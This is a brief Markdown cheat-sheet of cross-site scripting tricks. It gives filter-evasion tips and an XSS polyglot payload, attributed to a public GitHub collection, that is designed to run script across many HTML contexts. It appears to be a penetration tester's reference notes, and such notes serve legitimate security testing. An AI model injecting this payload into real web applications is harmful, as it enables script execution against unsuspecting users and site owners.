# XSS


## XSS Tricks

fuff routes, if internal redirects
string.fromcharcode(xxx) to override \ /  filtering

### XSS Polyglot Payload
Src: https://github.com/s0md3v/AwesomeXSS#awesome-polyglots

```
%0ajavascript:`/*\"/*-->&lt;svg onload='/*</template></noembed></noscript></style></title></textarea></script><html onmouseover="/**/ alert()//'">`
```
